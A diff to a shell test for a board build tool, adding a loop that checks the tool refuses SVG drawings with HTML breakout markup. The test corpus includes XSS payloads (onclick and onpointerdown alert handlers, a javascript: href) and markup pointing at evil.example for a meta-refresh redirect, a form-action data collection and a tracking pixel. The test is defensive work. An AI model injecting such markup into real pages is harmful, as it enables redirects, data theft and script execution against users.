@@ -566,6 +566,33 @@ test_a_payload_drawing_that_breaks_the_figure_contract_refuses_the_board() {
   [ "$rc" -ne 0 ] || fail "the board built with a drawing that can run code: $out"
   printf '%s' "$out" | grep -q "javascript:alert(1)" \
     || fail "the refusal does not name the href it refused: $out"
+
+  # The board is the far end of the same check, so the same corpus has to stop
+  # here too - including the HTML breakout markup that ends the svg and is
+  # reparsed as HTML on the page that hosts the answer channel.
+  local shape
+  for shape in \
+    '<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/board\">' \
+    '<button formaction=\"https://evil.example/collect\">Choose</button>' \
+    '<img src=\"https://evil.example/pixel\">' \
+    '<p></p><div></div><br>' \
+    '<foreignObject><body>x</body></foreignObject>' \
+    '<style>.bb-decision__foot{display:none}' \
+    '<rect onpointerdown=\"alert(1)\"/>' \
+    '<rect/onclick=\"alert(1)\"/>' \
+  ; do
+    payload=$(packet_payload en "[$(packet_figure cmp quiet loud)]" \
+      | jq --arg s "$shape" '.captains_call[0].packet.figures[0].svg |= sub("<text"; $s + "<text")')
+    printf '%s\n' "$payload" > "$home/payload.json"
+    set +e
+    out=$(PATH="$home/fakebin:$PATH" FM_HOME="$home" \
+      FM_STATE_OVERRIDE="$home/state" FM_DATA_OVERRIDE="$home/data" \
+      FM_PROCEVENT_CLAIM_ROOT="$home/procevent-claims" \
+      "$BOARD" build "$home/payload.json" 2>&1)
+    rc=$?
+    set -e
+    [ "$rc" -ne 0 ] || fail "the board inlined markup outside the drawing contract: $shape"
+  done
   pass "a payload drawing that breaks the figure contract refuses the board"
 }
 
